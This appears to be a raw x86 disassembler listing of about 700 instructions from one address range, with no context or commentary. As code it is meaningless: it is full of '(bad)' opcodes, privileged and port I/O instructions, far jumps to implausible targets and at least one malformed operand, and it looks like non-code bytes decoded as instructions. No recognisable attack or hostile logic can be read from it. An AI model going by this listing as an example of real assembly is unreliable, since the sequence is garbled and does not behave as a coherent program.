  4040aa:	out    0xde,al
  4040ac:	pop    ss
  4040ad:	push   ebp
  4040ae:	xchg   dx,ax
  4040b0:	push   ebx
  4040b1:	stos   BYTE PTR es:[edi],al
  4040b2:	xchg   DWORD PTR [esi+0x4772ee92],esp
  4040b8:	jnp    0x4040f6
  4040ba:	push   es
  4040bb:	dec    esp
  4040bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4040bd:	cmp    al,0xfe
  4040bf:	mov    ch,0xe6
  4040c1:	pop    edx
  4040c2:	aas    
  4040c3:	xor    esi,DWORD PTR [ecx+ebp*2-0x13b328c5]
  4040ca:	sti    
  4040cb:	xchg   ebx,eax
  4040cc:	ja     0x404146
  4040ce:	jb     0x4040ea
  4040d0:	mov    cl,0x88
  4040d2:	ja     0x404073
  4040d4:	xchg   ecx,eax
  4040d5:	mov    esi,0x2c27a58c
  4040da:	hlt    
  4040db:	outs   dx,DWORD PTR ds:[esi]
  4040dc:	adc    eax,DWORD PTR [eax+0x4b72fe2e]
  4040e2:	jle    0x4040fc
  4040e4:	scas   eax,DWORD PTR es:[edi]
  4040e5:	or     ecx,ecx
  4040e7:	mov    ds:0x6b542a6b,al
  4040ec:	bnd jmp 0x404141
  4040ef:	outs   dx,DWORD PTR ds:[esi]
  4040f0:	test   cl,ch
  4040f2:	pop    esi
  4040f3:	mov    ds:0x87ed433a,eax
  4040f8:	inc    edx
  4040f9:	adc    eax,0x64d62429
  4040fe:	cmp    eax,0x28d3ef3e
  404103:	aaa    
  404104:	shr    eax,1
  404106:	dec    BYTE PTR [ecx-0x18]
  404109:	pop    ss
  40410a:	mov    ebx,edx
  40410c:	xor    ch,BYTE PTR [esi-0x71973eb2]
  404112:	fmul   QWORD PTR [ebx+eax*1-0x66]
  404116:	push   esp
  404117:	ss nop
  404119:	push   ebx
  40411a:	xchg   edi,eax
  40411b:	call   0x624e1ac9
  404120:	adc    al,0x6a
  404122:	mov    ebp,0x79ec4e04
  404127:	sbb    BYTE PTR [ecx+0x45],bl
  40412a:	cmp    ah,cl
  40412c:	sub    al,0x31
  40412e:	push   eax
  40412f:	sub    eax,0xa1cc0159
  404134:	loop   0x40414f
  404136:	mov    esi,0xe777e5b7
  40413b:	icebp  
  40413c:	jg     0x404187
  40413e:	mov    dl,0x0
  404140:	aam    0xc5
  404142:	lahf   
  404143:	dec    ebp
  404144:	loop   0x4040f7
  404146:	xor    cl,dh
  404148:	dec    esp
  404149:	pop    ds
  40414a:	add    BYTE PTR [ebx+0x2a],dh
  40414d:	enter  0x39d4,0xd5
  404151:	cmp    ebx,ebx
  404153:	lds    ecx,FWORD PTR [edi-0x79a66f6b]
  404159:	dec    esi
  40415a:	test   DWORD PTR [edi-0x58820506],0xf493b174
  404164:	(bad)  
  404165:	jno    0x404115
  404167:	xchg   edx,esp
  404169:	lods   eax,DWORD PTR ds:[esi]
  40416a:	retf   0xb7b1
  40416d:	fwait
  40416e:	xlat   BYTE PTR ds:[ebx]
  40416f:	push   ecx
  404170:	pop    ss
  404171:	or     BYTE PTR [ebp-0x20],ch
  404174:	inc    esp
  404175:	ret    
  404176:	sub    ah,BYTE PTR [ebx+0x2b]
  404179:	shl    BYTE PTR [ecx+0x478967b5],1
  40417f:	out    0x92,eax
  404181:	xchg   ebp,eax
  404182:	and    BYTE PTR [eax+0x5af7127b],cl
  404188:	xor    ebx,ebp
  40418a:	inc    eax
  40418b:	jo     0x19f67f3
  404191:	push   0xffffff95
  404193:	lods   eax,DWORD PTR ds:[esi]
  404194:	ins    DWORD PTR es:[edi],dx
  404195:	mov    al,0x9f
  404197:	scas   eax,DWORD PTR es:[edi]
  404198:	pop    ds
  404199:	push   ecx
  40419a:	or     BYTE PTR [edi+0x27a4ddb0],bl
  4041a0:	sahf   
  4041a1:	sub    DWORD PTR [esi-0x67c2fc86],edi
  4041a7:	pusha  
  4041a8:	test   eax,0xda026220
  4041ad:	out    dx,al
  4041ae:	js     0x40419a
  4041b0:	(bad)  
  4041b1:	pop    ebp
  4041b2:	mov    al,ds:0x4a61819a
  4041b7:	aad    0x1
  4041b9:	xchg   edx,eax
  4041ba:	mov    edx,0x374bdedf
  4041bf:	push   ds
  4041c0:	ror    BYTE PTR ds:0x6f93e806,cl
  4041c6:	(bad)  
  4041c8:	into   
  4041c9:	test   DWORD PTR [ecx-0x21],eax
  4041cc:	xchg   edx,edi
  4041ce:	sahf   
  4041cf:	into   
  4041d0:	cmp    edx,ebx
  4041d2:	mov    eax,ds:0x326e5ecb
  4041d7:	pop    esi
  4041d8:	mov    edi,DWORD PTR [eax]
  4041da:	rol    bh,1
  4041dc:	(bad)  
  4041dd:	lock or dh,BYTE PTR [eax+0x3edfe704]
  4041e4:	sbb    DWORD PTR ds:0x7034e9ee,0xb8e2fbb8
  4041ee:	hlt    
  4041ef:	rcr    BYTE PTR [edx],0x65
  4041f2:	and    eax,0xa167b55d
  4041f7:	push   ss
  4041f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4041f9:	jnp    0x404214
  4041fb:	push   esi
  4041fc:	xchg   esi,eax
  4041fd:	mov    al,ds:0x614dedc4
  404202:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404203:	and    DWORD PTR [ebx],0xb5f7f79f
  404209:	mov    ecx,0xbf3fb030
  40420e:	inc    ecx
  40420f:	mov    eax,0xbbe52a3d
  404214:	mov    eax,0xf3a36d3f
  404219:	les    eax,FWORD PTR [ebp+0xa]
  40421c:	pop    es
  40421d:	std    
  40421e:	mov    dh,0x4e
  404220:	push   ss
  404221:	add    cl,BYTE PTR [ecx]
  404223:	test   BYTE PTR [edi+0x35],0xab
  404227:	call   0xff0f:0x1cf78252
  40422e:	cmc    
  40422f:	mov    ebx,0xd42b72f7
  404234:	xchg   edx,eax
  404235:	popa   
  404236:	inc    edi
  404237:	mov    edi,0xdd5bc80
  40423c:	xor    bl,BYTE PTR [edi]
  40423e:	fild   QWORD PTR [ebx+edi*2]
  404241:	stos   BYTE PTR es:[edi],al
  404242:	inc    ecx
  404243:	or     eax,0xd07e1a11
  404248:	mov    WORD PTR [eax-0x3c63ba8],fs
  40424e:	xor    cl,BYTE PTR gs:[esi-0x72ac9eee]
  404255:	dec    ebp
  404256:	and    BYTE PTR [eax],al
  404258:	inc    esp
  404259:	xchg   ebp,eax
  40425a:	push   edx
  40425b:	ret    
  40425c:	inc    ebx
  40425d:	rcl    BYTE PTR [esi-0x72],cl
  404260:	mov    edi,0xbd9fb8fa
  404265:	push   0xffffffd0
  404267:	ret    0xa4bf
  40426a:	dec    eax
  40426b:	fcomp  QWORD PTR [edi+ecx*8-0xe]
  40426f:	sti    
  404270:	push   ebp
  404271:	add    esp,esi
  404273:	stos   DWORD PTR es:[edi],eax
  404274:	and    BYTE PTR [esi+0x66],ch
  404277:	fst    DWORD PTR [esi]
  404279:	pop    edx
  40427a:	adc    al,0x6a
  40427c:	cmp    esp,0x1850851b
  404282:	into   
  404283:	ss dec eax
  404285:	enter  0xe9b3,0x83
  404289:	adc    BYTE PTR [esi+ebx*2+0x43d81ac3],ch
  404290:	pop    esi
  404291:	xchg   esi,eax
  404292:	int3   
  404293:	mov    al,ds:0x2f45a19c
  404298:	or     BYTE PTR [ebp-0x35],ah
  40429b:	add    cl,BYTE PTR [esi]
  40429d:	retf   0xd498
  4042a0:	adc    al,0xea
  4042a2:	jnp    0x404236
  4042a4:	repz iret 
  4042a6:	mov    cl,0xd8
  4042a8:	add    ch,BYTE PTR [ecx-0x508296e]
  4042ae:	cwde   
  4042af:	fs pop eax
  4042b1:	popa   
  4042b2:	out    dx,eax
  4042b3:	mov    ecx,0xa1f99325
  4042b8:	jne    0x404317
  4042ba:	mov    ecx,0x75cff825
  4042bf:	add    al,0xab
  4042c1:	pop    ds
  4042c2:	scas   al,BYTE PTR es:[edi]
  4042c3:	(bad)  
  4042c5:	jmp    0x4042f1
  4042c7:	mov    ah,0xa0
  4042c9:	xor    ebp,edi
  4042cb:	push   edx
  4042cc:	pusha  
  4042cd:	xor    BYTE PTR ds:0xc8b04e03,0xe
  4042d4:	inc    ecx
  4042d5:	cmp    eax,0xa3db48c6
  4042da:	fcomp  QWORD PTR [ebx]
  4042dc:	aad    0xa0
  4042de:	inc    esp
  4042df:	xchg   ecx,eax
  4042e0:	je     0x4042ac
  4042e2:	cs mov ebx,0x2a7c7293
  4042e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4042e9:	and    DWORD PTR [edi+0x6f5c330c],0xa00bd94d
  4042f3:	push   esp
  4042f4:	mov    dh,0xb
  4042f6:	lock mov WORD PTR ss:[esp+edx*4+0x69],cs
  4042fc:	xchg   DWORD PTR [edx+0x24],ecx
  4042ff:	add    dl,BYTE PTR [eax+0x7bf6c87e]
  404305:	inc    edx
  404306:	ins    DWORD PTR es:[edi],dx
  404307:	gs ss dec esp
  40430a:	arpl   WORD PTR [ebp-0x59d6576],cx
  404310:	adc    ebx,DWORD PTR [ebx+0x16]
  404313:	dec    esp
  404314:	test   DWORD PTR [ebx+0x31efbff5],ebx
  40431a:	retf   
  40431b:	inc    BYTE PTR [ebp-0x18]
  40431e:	push   edi
  40431f:	push   ds
  404320:	jmp    0x7577:0xd755998
  404327:	lock ret 0x78ed
  40432b:	(bad)  
  40432d:	push   ss
  40432e:	pop    eax
  40432f:	prefetch BYTE PTR [ebp-0x5a5a8646]
  404336:	frstor [edi+0x5a]
  404339:	mov    al,0x3d
  40433b:	jmp    0x4042f7
  40433d:	repz adc BYTE PTR [esi+0x4d087b5e],0x60
  404345:	jge    0x4042e3
  404347:	inc    ebx
  404349:	jp     0x4043a4
  40434b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40434c:	fstp   DWORD PTR [esp+eiz*8-0x17]
  404350:	mov    ch,0xa5
  404352:	sub    al,0x33
  404354:	sbb    ecx,DWORD PTR [eax-0x51]
  404357:	mov    DWORD PTR [edx-0x292c91a9],esp
  40435d:	push   0xffffffdb
  40435f:	add    ecx,DWORD PTR [edx+0x20130f3a]
  404365:	sub    BYTE PTR [edi+0x71],cl
  404368:	pop    edi
  404369:	rcl    ebp,0xaf
  40436c:	(bad)  
  40436d:	xor    al,0xa1
  40436f:	in     eax,dx
  404370:	arpl   cx,cx
  404372:	call   0x4c79:0x7694e52a
  404379:	and    ah,dl
  40437b:	mov    ebx,0xad4e353a
  404380:	jb     0x4043e9
  404382:	inc    eax
  404383:	xchg   edx,eax
  404384:	fcmovbe st,st(4)
  404386:	iret   
  404387:	mov    eax,ds:0x6bf33ddf
  40438c:	dec    esi
  40438d:	or     DWORD PTR ds:0x309b3c2b,esi
  404393:	cdq    
  404394:	in     al,dx
  404395:	add    eax,0x4b556b71
  40439a:	sbb    esp,DWORD PTR [ecx]
  40439c:	cmp    DWORD PTR [edi-0x27b7019e],ebx
  4043a2:	imul   edx,DWORD PTR [ecx+edi*8],0x10
  4043a6:	aas    
  4043a7:	xchg   esp,eax
  4043a8:	test   al,0xdc
  4043aa:	cld    
  4043ab:	hlt    
  4043ac:	cmp    DWORD PTR [edx-0x37],0xffffffbe
  4043b0:	mov    esi,0x878d8bf6
  4043b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4043b6:	and    bl,BYTE PTR [edx-0x4f]
  4043b9:	pop    ebx
  4043ba:	test   al,0x56
  4043bc:	inc    eax
  4043bd:	sbb    BYTE PTR [ebx+0x71],cl
  4043c0:	inc    ecx
  4043c1:	aam    0xc5
  4043c3:	inc    edx
  4043c4:	dec    esp
  4043c5:	les    edi,FWORD PTR [esi-0x49]
  4043c8:	jmp    0xe996e3a6
  4043cd:	les    ecx,FWORD PTR [edi+0x65b72b55]
  4043d3:	aad    0xf3
  4043d5:	daa    
  4043d6:	add    bl,bh
  4043d8:	push   ss
  4043d9:	ins    BYTE PTR es:[edi],dx
  4043da:	push   ss
  4043db:	cmp    ebx,ebp
  4043dd:	push   esp
  4043de:	in     eax,dx
  4043df:	push   cs
  4043e0:	(bad)  
  4043e2:	mov    al,0xbb
  4043e4:	jl     0x40437b
  4043e6:	clc    
  4043e7:	and    esi,DWORD PTR [edx+0x66]
  4043ea:	pop    eax
  4043eb:	adc    eax,0xf122eaae
  4043f0:	aas    
  4043f1:	xchg   edi,eax
  4043f2:	inc    esi
  4043f3:	cmc    
  4043f4:	cmp    esi,edx
  4043f6:	mov    edx,0x10b83d0f
  4043fb:	scas   al,BYTE PTR es:[edi]
  4043fc:	test   eax,0x8282fb1e
  404401:	mov    WORD PTR [esi+0x5e],es
  404404:	ds push eax
  404406:	or     BYTE PTR [edx+0x33],0x3
  40440a:	xchg   ecx,eax
  40440b:	out    dx,al
  40440c:	xor    eax,0x81831565
  404411:	mov    al,0xda
  404413:	sub    eax,DWORD PTR [ebx+ecx*2-0x1a40e883]
  40441a:	pop    ss
  40441b:	call   0x61ee4099
  404420:	ss dec esp
  404422:	dec    ecx
  404423:	xlat   BYTE PTR ds:[ebx]
  404424:	add    edx,DWORD PTR [esi-0x61]
  404427:	jmp    0x7af6:0x3baee4a4
  40442e:	mov    ah,0x73
  404430:	add    ecx,DWORD PTR [edx+0x51]
  404433:	pop    ebp
  404434:	pop    ds
  404435:	push   edx
  404436:	sar    DWORD PTR [edi],0xe8
  404439:	ror    dl,1
  40443b:	test   BYTE PTR [edi-0x61cf8321],dh
  404441:	into   
  404442:	xor    eax,0x1afa5d55
  404447:	cmp    al,0xf
  404449:	neg    DWORD PTR [ecx+0x325d86da]
  40444f:	test   BYTE PTR [ebp+esi*2-0x3a],ch
  404453:	push   0x44e70a15
  404458:	xchg   BYTE PTR [eax-0x7248d408],dh
  40445e:	push   ebp
  40445f:	add    ch,bl
  404461:	sar    BYTE PTR [eax+0x61ff0825],0x91
  404468:	rol    BYTE PTR [eax-0x2b58932c],1
  40446e:	push   ds
  40446f:	(bad)
  404473:	(bad)
  404476:	sbb    DWORD PTR [eax+0x4d318663],esp
  40447c:	jmp    0x40442e
  40447e:	aam    0x1e
  404480:	push   eax
  404481:	aad    0xcc
  404483:	push   0xa62cdb20
  404488:	fisttp QWORD PTR [ecx-0x2f]
  40448b:	cmp    BYTE PTR [edi],0xd6
  40448e:	inc    esi
  40448f:	dec    ebx
  404490:	jbe    0x4044a4
  404492:	ja     0x40442c
  404494:	div    BYTE PTR [ecx+0x4de91ff4]
  40449a:	mov    eax,ds:0x1649ddbf
  40449f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4044a0:	mov    dh,0xb7
  4044a2:	loope  0x404506
  4044a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4044a5:	mov    al,0x58
  4044a7:	or     DWORD PTR [ecx],edi
  4044a9:	sti    
  4044aa:	neg    BYTE PTR [eax+0x54]
  4044ad:	fidivr DWORD PTR [ecx+0x171a1c97]
  4044b3:	(bad)  
  4044b4:	fild   QWORD PTR [edi-0x9]
  4044b7:	outs   dx,DWORD PTR ds:[esi]
  4044b8:	mov    dh,BYTE PTR [eax]
  4044ba:	mov    ah,0x67
  4044bc:	je     0x40449b
  4044be:	test   BYTE PTR [esi+0x56c639c8],bh
  4044c4:	scas   al,BYTE PTR es:[edi]
  4044c5:	push   cs
  4044c6:	dec    esi
  4044c7:	and    al,0x4
  4044c9:	and    al,0x72
  4044cb:	mov    edx,0x348df8cf
  4044d0:	push   ebp
  4044d1:	jp     0x4044dc
  4044d3:	and    BYTE PTR ds:0x57f4c89f,al
  4044d9:	outs   dx,BYTE PTR ds:[esi]
  4044da:	push   ss
  4044db:	pop    esi
  4044dc:	mov    ch,0xc7
  4044de:	fistp  QWORD PTR [ebx-0x6b]
  4044e1:	ins    BYTE PTR es:[edi],dx
  4044e2:	add    al,0x81
  4044e4:	cmp    al,ch
  4044e6:	stos   DWORD PTR es:[edi],eax
  4044e7:	(bad)  
  4044e8:	repnz pop edi
  4044ea:	xchg   eax,eax
  4044ec:	(bad)
  4044ef:	cmp    al,0xc
  4044f1:	adc    edx,DWORD PTR [edi]
  4044f3:	repnz and DWORD PTR [ebx+0x56],ecx
  4044f7:	xchg   edx,eax
  4044f8:	cmp    BYTE PTR [ebx+0xe72243c],dl
  4044fe:	mov    ebx,0x543582c1
  404503:	jl     0x4044fa
  404505:	repnz dec ecx
  404507:	mov    al,ds:0x39065f09
  40450c:	js     0x404505
  40450e:	je     0x4044a6
  404510:	xor    BYTE PTR [eax],bl
  404512:	popa   
  404513:	dec    ecx
  404514:	int    0x4e
  404516:	(bad)  
  404517:	scas   al,BYTE PTR es:[edi]
  404518:	call   0x406e3670
  40451d:	mov    ah,0x69
  40451f:	cmp    eax,0x255108cd
  404524:	jge    0x404562
  404526:	ret    0x512a
  404529:	pop    ebp
  40452a:	mov    esp,0x1f58aa1c
  40452f:	cs mov ah,0x58
  404532:	std    
  404533:	pushf  
  404534:	dec    edi
  404535:	xor    BYTE PTR [ebp-0x44],0xfd
  404539:	jge    0x40455c
  40453b:	loopne 0x404543
  40453d:	aam    0xf1
  40453f:	je     0x404520
  404541:	pop    ecx
  404542:	mov    eax,ds:0x8b2e60e1
  404547:	les    esi,FWORD PTR [ecx]
  404549:	pop    ebx
  40454a:	out    0x16,al
  40454c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40454d:	pop    ss
  40454e:	pop    esi
  40454f:	cwde   
  404550:	test   ch,0xb5
  404553:	cmp    dl,BYTE PTR [esi+ecx*1+0x79]
  404557:	ret    
  404558:	loop   0x4044e1
  40455a:	jmp    FWORD PTR [edi-0x6d]
  40455d:	shr    DWORD PTR [ecx+0x68],1
  404560:	mov    ecx,0x3ee57ea
  404565:	fsub   DWORD PTR [ebx]
  404567:	jge    0x4045d4
  404569:	push   edx
  40456a:	mov    ecx,0x7036543c
  40456f:	push   edx
  404570:	mov    ebp,0x95005ec5
  404575:	jns    0x40456e
  404577:	jle    0x4045cb
  404579:	push   eax
  40457a:	iret   
  40457b:	cdq    
  40457c:	inc    eax
  40457d:	hlt    
  40457e:	pop    edi
  40457f:	lea    edx,ds:0x703e3b41
  404585:	add    dh,BYTE PTR [eax]
  404587:	mov    dl,0xa2
  404589:	inc    edi
  40458a:	stc    
  40458b:	and    eax,0x1944006d
  404590:	add    eax,0x9874ed54
  404595:	and    dh,BYTE PTR [eax+0x5a]
  404598:	xchg   ebx,eax
  404599:	mov    dh,0x52
  40459b:	ss mov dh,0x9b
  40459e:	cwde   
  40459f:	dec    esi
  4045a0:	dec    edx
  4045a1:	int    0x1e
  4045a3:	jmp    0x4045b3
  4045a5:	ins    DWORD PTR es:[edi],dx
  4045a6:	adc    DWORD PTR [eax+0x131c2b56],eax
  4045ac:	push   cs
  4045ad:	push   ebx
  4045ae:	inc    edi
  4045af:	lds    edi,FWORD PTR [esp+esi*8+0x74]
  4045b3:	mov    ecx,cs
  4045b5:	and    dh,BYTE PTR [esi-0x59c6e648]
  4045bb:	mov    edi,0x35951f05
  4045c0:	and    al,0xf0
  4045c2:	mov    bh,0xe6
  4045c4:	and    bl,BYTE PTR [eax+0x775e44df]
  4045ca:	and    al,0xec
  4045cc:	(bad)  
  4045ce:	xchg   esi,eax
  4045cf:	loope  0x404627
  4045d1:	(bad)  
  4045d2:	or     DWORD PTR [ebx+0x42],ebp
  4045d5:	mov    bl,0xee
  4045d7:	lock clc 
  4045d9:	jnp    0x404602
  4045db:	xchg   ebx,eax
  4045dc:	cli    
  4045dd:	aaa    
  4045de:	mov    ah,0xb6
  4045e0:	adc    al,0xdb
  4045e2:	je     0x4045a1
  4045e4:	xlat   BYTE PTR ds:[ebx]
  4045e5:	scas   al,BYTE PTR es:[edi]
  4045e6:	or     al,0x9c
  4045e8:	cmc    
  4045e9:	ret    
  4045ea:	ins    BYTE PTR es:[edi],dx
  4045eb:	fwait
  4045ec:	mov    dh,0x59
  4045ee:	lds    edi,FWORD PTR [esi+eax*1-0x3]
  4045f2:	pop    es
  4045f3:	fld    DWORD PTR [esi-0x60]
  4045f6:	sbb    eax,0x4260a319
  4045fb:	ror    DWORD PTR [ebx+0xb],0xf8
  4045ff:	lods   al,BYTE PTR ds:[esi]
  404600:	push   ebx
  404602:	repz fisubr WORD PTR [ebx+ecx*1+0x76]
  404607:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404608:	push   edi
  404609:	xlat   BYTE PTR ds:[ebx]
  40460a:	cdq    
  40460b:	or     BYTE PTR [edx+0x27],dh
  40460e:	call   0x734e:0x79555cef
  404615:	fwait
  404616:	inc    edi
  404617:	fist   WORD PTR [ebx+0x5a]
  40461a:	xchg   esi,eax
  40461b:	aad    0x8f
  40461d:	mov    ds:0xf7eaaa23,ax
  404623:	xchg   ebx,eax
  404624:	sti    
  404625:	adc    ch,BYTE PTR [edx+edx*2]
  404628:	lock mov ecx,0x11d88b71
  40462e:	outs   dx,DWORD PTR ds:[esi]
  40462f:	imul   esp,edx,0xffffffe9
  404632:	fwait
  404633:	sub    eax,0xffa4ff7e
  404638:	sbb    DWORD PTR [ecx+0x574491fc],0xb
  40463f:	pop    ebp
  404640:	xlat   BYTE PTR ds:[ebx]
  404641:	fcmovu st,st(6)
  404643:	sbb    edi,eax
  404645:	cdq    
  404646:	and    al,dl
  404648:	xor    al,0x18
  40464a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40464b:	pushf  
  40464c:	test   eax,0x2f9f5466
  404651:	sbb    eax,0x282f149f
  404656:	push   cs
  404657:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404658:	or     BYTE PTR [eax-0x3518bf78],bh
  40465e:	loope  0x404684
  404660:	ficom  WORD PTR [esi+0x23]
  404663:	or     eax,0x3de7f1f4
  404668:	scas   eax,DWORD PTR es:[edi]
  404669:	int3   
  40466a:	out    0x25,eax
  40466c:	je     0x4046a6
  40466e:	call   0xfd4:0xb7a3583e
  404675:	cmp    ecx,ebp
  404677:	xor    edx,DWORD PTR [edx+ebp*2]
  40467a:	pop    edx
  40467b:	add    edx,edx
  40467d:	stos   DWORD PTR es:[edi],eax
  40467e:	lea    esp,[ecx-0x23bff35]
  404684:	mov    bh,0x89
  404686:	inc    esi
  404687:	push   es
  404688:	inc    esi
  404689:	push   ebp
  40468a:	loope  0x40468d
  40468c:	jecxz  0x404627
  40468e:	dec    ecx
  40468f:	cdq    
  404690:	imul   ebp,DWORD PTR [edx+0x1548c8],0xffffffc6
  404697:	in     al,0x16
  404699:	dec    esi
  40469a:	and    DWORD PTR [ebx+edi*8+0x3a],ecx
  40469e:	(bad)  
  40469f:	adc    DWORD PTR ds:0x6603a333,edi
  4046a5:	cmc    
  4046a6:	hlt    
  4046a7:	iret   
  4046a8:	(bad)  
  4046a9:	jle    0x40465d
  4046ab:	(bad)  
  4046ac:	jge    0x4046f4
  4046ae:	jge    0x404634
  4046b0:	lods   al,BYTE PTR ds:[esi]
  4046b1:	enter  0x27a,0x8c
  4046b5:	repnz sti 
  4046b7:	mov    al,0xac
  4046b9:	sub    edx,DWORD PTR [ebp+0x6c]
  4046bc:	outs   dx,BYTE PTR ds:[esi]
  4046bd:	push   es
  4046be:	add    eax,0xf6e643ea
  4046c3:	or     al,0x29
  4046c6:	cmp    BYTE PTR [edi+0x5a6e908d],dl
  4046cc:	adc    DWORD PTR [esi],edx
  4046ce:	mov    al,0x2c
  4046d0:	ret    
  4046d1:	sbb    DWORD PTR [edx+0x580f9e71],0x0
  4046d8:	sbb    eax,DWORD PTR [esi+0x193b4f02]
  4046de:	or     al,BYTE PTR [ebx]
  4046e0:	inc    ebp
  4046e1:	scas   al,BYTE PTR es:[edi]
  4046e2:	xchg   ebp,eax
  4046e3:	push   esp
  4046e4:	lds    eax,FWORD PTR [ecx-0x7f895e24]
  4046ea:	out    0xe4,al
  4046ec:	mov    esi,DWORD PTR [edi+0x6cb15414]
  4046f2:	mov    ecx,db4
  4046f5:	data16 cs cli 
  4046f8:	dec    ebp
  4046f9:	sbb    al,0x1
  4046fb:	mov    al,ds:0x90a6df82
  404700:	pop    ebx
  404701:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404702:	daa    
  404703:	or     dh,BYTE PTR [ecx+0x59b26677]
  404709:	pushf  
  40470a:	mov    dh,0xb5
  40470c:	dec    eax
  40470d:	cmp    al,0x47
  40470f:	or     BYTE PTR [esi-0x196544ad],dh
  404715:	(bad)  
  404716:	int3   
  404717:	outs   dx,BYTE PTR ds:[esi]
  404718:	loope  0x404718
  40471a:	retf   0xe2c7
  40471d:	inc    edx
  40471e:	pop    ss
  40471f:	test   eax,0xe5bda06d
  404724:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404725:	jns    0x4046ab
  404727:	inc    ebp
  404728:	leave  
  404729:	ss mov dh,al
  40472c:	mov    ch,0xd0
  40472e:	inc    ebx
  40472f:	mov    dl,0x55
  404731:	js     0x4047b1
  404733:	fnsave [edi+0x47]
  404736:	pushf  
  404737:	cmp    edi,ecx
  404739:	xchg   esi,eax
  40473a:	add    cl,BYTE PTR [edx+0x2e79bb2b]
  404740:	pop    es
  404741:	shr    DWORD PTR [ebx-0x160d5e35],0x22
  404748:	xor    bh,dl
  40474a:	push   ds
  40474b:	outs   dx,BYTE PTR ds:[esi]
  40474c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40474d:	and    al,0xd0
  40474f:	add    eax,eax
  404751:	push   ebp
  404752:	xor    BYTE PTR [edx+ebp*8+0x27],0xf7
  404757:	enter  0x6f3f,0x94
  40475b:	jo     0x404712
  40475d:	dec    ebx
  40475e:	scas   eax,DWORD PTR es:[edi]
  40475f:	into   
  404760:	sub    BYTE PTR [eax],bl
  404762:	pop    ecx
  404763:	ins    BYTE PTR es:[edi],dx
  404764:	sub    ecx,DWORD PTR [eax]
  404766:	fsub   DWORD PTR [ebx]
  404768:	sub    esp,ebp
  40476a:	in     eax,0xaa
  40476c:	ret    0x6fd7
  40476f:	cwde   
  404770:	adc    DWORD PTR [ecx+ebx*1],0x17650743
  404777:	data16 and al,0x2
  40477a:	xor    DWORD PTR [ecx+0x3e494965],edx
  404780:	cmp    al,BYTE PTR [ebx+0x7b]
  404783:	mov    edx,0xf07eff31
  404788:	jnp    0x404771
  40478a:	dec    ebp
  40478b:	fisubr DWORD PTR [eax-0xb]
  40478e:	cmp    al,0x73
  404790:	fcmovu st,st(0)
  404792:	sbb    esi,DWORD PTR [ecx+0x40]
  404795:	gs leave 
  404797:	(bad)  
  404798:	jmp    0x4047df
  40479a:	jo     0x4047a0
  40479c:	pop    esp
  40479d:	mov    cl,0x2a
  40479f:	mov    ebx,0x9ef03df8
  4047a4:	setae  BYTE PTR [esi]
  4047a7:	mov    eax,0xfa4c79c6
  4047ac:	dec    ecx
  4047ad:	jns    0x404768
  4047af:	dec    eax
  4047b0:	push   eax
  4047b1:	mov    bh,0xf4
  4047b3:	js     0x404789
  4047b5:	pop    es
  4047b6:	jo     0x40477e
  4047b8:	push   0x376c21c5
  4047bd:	cmp    ebp,DWORD PTR [ebx-0x80]
  4047c0:	cmp    dh,0xf2
  4047c3:	pusha  
  4047c4:	imul   BYTE PTR [ecx]
  4047c6:	cli    
  4047c7:	xchg   esp,eax
  4047c8:	add    BYTE PTR [edi+0x33],cl
  4047cb:	xor    eax,0x822effe8
  4047d0:	mov    ch,0x4b
  4047d2:	cli    
  4047d3:	and    DWORD PTR [ecx-0x77b9bed3],edi
  4047d9:	cmp    DWORD PTR [edi],0xaa3a50cf
  4047df:	je     0x40481e
  4047e1:	adc    DWORD PTR [edi-0x6378803f],ebp
  4047e7:	mov    al,0xa9
  4047e9:	dec    esp
  4047ea:	and    ebx,DWORD PTR [edi+0xa0c9a5a]
  4047f0:	dec    eax
  4047f1:	inc    ebp
  4047f2:	lea    edx,[edx+0x27]
  4047f5:	adc    al,0xda
  4047f7:	pop    ss
  4047f8:	cmp    ebp,DWORD PTR [eax-0x6ed0c269]
  4047fe:	aad    0x48
  404800:	cmp    BYTE PTR [esi],0x34
  404803:	jl     0x404849
  404805:	pop    ecx
  404806:	call   FWORD PTR [eax-0x7ac6451a]
  40480c:	jle    0x404842
  40480e:	mov    WORD PTR [ecx-0x66],ss
  404811:	test   BYTE PTR [ecx+0x32],bh
  404814:	bound  ebx,QWORD PTR [edi+0x19]
  404817:	loop   0x404817
  404819:	push   es
  40481a:	inc    edx
  40481b:	add    esp,DWORD PTR [ecx]
  40481d:	add    ah,0x72
  404820:	and    al,BYTE PTR [ecx+ecx*1]
  404823:	push   ebx
  404824:	and    al,0x4
  404826:	xchg   ecx,eax
  404827:	xchg   ebp,eax
  404828:	xchg   edi,eax
  404829:	add    eax,0x40ad2acb
  40482e:	sub    eax,0xbe371b01
  404833:	jmp    0x7901:0x469b4b9a
  40483a:	mov    dl,0x7f
  40483c:	fwait
  40483d:	xlat   BYTE PTR ds:[ebx]
  40483e:	dec    esp
  40483f:	test   DWORD PTR [ebx+0x4f],esp
  404842:	daa    
  404843:	mov    al,ch
  404845:	hlt    
  404846:	adc    DWORD PTR [esp+edx*4],edx
  404849:	xchg   BYTE PTR [edi+0x7282788f],bh
  40484f:	inc    ebx
  404850:	pop    esi
  404851:	push   ebp
  404852:	and    edx,esp
  404854:	push   esp
  404855:	pop    esp
  404856:	adc    DWORD PTR [edi-0x28],esi
  404859:	mov    edx,fs
  40485b:	(bad)  
  40485c:	jge    0x40489a
  40485e:	adc    eax,0x40a32129
  404863:	js     0x4047f1
  404865:	sbb    dl,BYTE PTR [ecx+0x38]
  404868:	repnz or al,0xb7
  40486b:	dec    edx
  40486c:	pop    eax
  40486d:	jne    0x4048b9
  40486f:	pop    esi
  404870:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
